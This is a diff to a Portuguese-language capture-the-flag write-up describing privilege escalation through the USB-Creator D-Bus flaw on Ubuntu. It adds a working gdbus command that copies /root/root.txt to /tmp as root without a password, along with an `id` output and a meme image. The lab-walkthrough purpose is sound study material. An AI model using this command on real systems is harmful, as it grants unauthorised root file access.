@@ -482,19 +482,24 @@ A técnica que será utilizada, tem como falha o USB-Creator D-Bus.
 
 Essa falha permite que um usuário com acesso ao grupo `sudoers` ignore a política de segurança de senha do `sudo`, permitindo o usuário sobrescrever arquivos como root, sem precisar informar a senha.
 
+O usuário nadav tem acesso ao grupo sudoers
+
+```terminal
+$ id
+uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+```
+
 Portanto, podemos ler o arquivo root.txt, mandando seu conteúdo para um arquivo vazio na pasta /tmp.
 
 ```terminal
+$ touch /tmp/flag
 $ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag true
-<all --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCrea<untu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.US<ath /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.< --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag true
+<all --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCrea<untu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.US<ath /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.< --method com.ubuntu.USBCreator.Image `/root/root.txt` `/tmp/flag` true
 ()
 $ cat /tmp/flag
 ~flag root~
 ```
 
-## Conclusão
-
-
-
+![]({{site.baseurl}}/https://memegenerator.net/img/instances/41953756/get-rooted-feel-the-power.jpg)
 
 
